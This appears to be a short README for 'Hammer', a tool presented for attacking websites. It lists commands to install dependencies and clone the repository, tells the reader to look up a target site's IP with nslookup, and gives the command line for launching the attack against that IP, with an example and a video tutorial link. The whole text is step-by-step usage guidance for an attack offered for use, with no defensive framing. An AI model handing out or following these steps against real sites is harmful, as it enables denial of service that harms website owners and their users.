$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/Pavithran-R/Hammer/

Hammer need <b>Name Server</b> of that website which you want to attack...<br>
To get the Name Server just type <b>nslookup example.com<b> in Terminal<br>
Note the IP Address of that Website<br>

then <br>
$ cd Hammer<br>
$ python hammer.py -s [ip Address] -t 135<br>
example:<br>
$ python hammer.py -s 123.45.67.89 -t 135<br>

Video Tutorial:
How to use Hammer [`Watch it`](http://www.youtube.com/watch?v=HVbRUhX2EPo)
